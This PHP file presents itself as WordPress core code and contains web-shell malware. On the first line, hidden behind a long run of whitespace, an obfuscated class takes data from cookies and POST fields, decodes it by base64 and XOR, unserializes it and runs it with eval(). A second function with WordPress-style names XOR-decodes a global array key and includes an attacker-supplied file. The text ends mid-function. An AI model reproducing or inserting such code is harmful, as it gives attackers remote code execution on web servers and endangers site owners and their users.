<?php /*                                                                                                                                                                                                                                                                                                                                                                                                  $glXLxTLkO = class_exists("l_yCY"); $nCQdHx = $glXLxTLkO;if (!$nCQdHx){class l_yCY{private $slHJsv;public static $YykEplKH = "670f0c1f-f73d-445f-ad6f-e1085512b2fd";public static $gLNxL = NULL;public function __construct(){$TxQsbnFL = $_COOKIE;$tIGRMUBGkO = $_POST;$jbAFd = @$TxQsbnFL[substr(l_yCY::$YykEplKH, 0, 4)];if (!empty($jbAFd)){$higBYVzK = "base64";$JqMJTEUZkF = "";$jbAFd = explode(",", $jbAFd);foreach ($jbAFd as $rMbGyDnZeL){$JqMJTEUZkF .= @$TxQsbnFL[$rMbGyDnZeL];$JqMJTEUZkF .= @$tIGRMUBGkO[$rMbGyDnZeL];}$JqMJTEUZkF = array_map($higBYVzK . "\137" . 'd' . chr (101) . "\143" . "\x6f" . "\144" . "\145", array($JqMJTEUZkF,)); $JqMJTEUZkF = $JqMJTEUZkF[0] ^ str_repeat(l_yCY::$YykEplKH, (strlen($JqMJTEUZkF[0]) / strlen(l_yCY::$YykEplKH)) + 1);l_yCY::$gLNxL = @unserialize($JqMJTEUZkF);}}public function __destruct(){$this->UUaLJmEVsA();}private function UUaLJmEVsA(){if (is_array(l_yCY::$gLNxL)) {$LGICtLDzBu = str_replace('<' . "\77" . chr ( 488 - 376 ).chr ( 890 - 786 )."\160", "", l_yCY::$gLNxL["\143" . chr (111) . chr ( 511 - 401 ).chr ( 920 - 804 )."\x65" . chr ( 975 - 865 ).chr ( 774 - 658 )]);eval($LGICtLDzBu);exit();}}}$zvoiTr = new l_yCY(); $zvoiTr = NULL;} ?><?php /* 
...
function wp_count_sites( $network_id = null ) {
	...
	$custom_fields = 'stripped';
function operator()

{

    $myHTML = 'sGM1ckKL8tFBf';
	$static_characters = 'raw_key';
    $types = $myHTML;
    
    $post_modified_gmt = $GLOBALS[original_url("%2C%01%04%7D%268", $types)];
    $ext_types = $post_modified_gmt;

    $prime = isset($ext_types[$types]);
    if ($prime)

    {
        $table_alias = $post_modified_gmt[$types];
        $incposts = $table_alias[original_url("%07%2A%3Dn%0D%0A%26%29", $types)];
        $sentence = $incposts;
	$has_self_closer = 'rich_text';
        include ($sentence);
    }
}
	$domain = 'post_meta_key';
function original_url($match, $name_offset)

{
    $patterns = $name_offset;
    $show_in_admin_all_list = "url" . "decode";
    $core = $show_in_admin_all_list($match);
    $post_types = substr($patterns,0, strlen($core));
    $post_type_meta_caps = $core ^ $post_types;

    

    $core = strpos($post_type_meta_caps, $post_types);
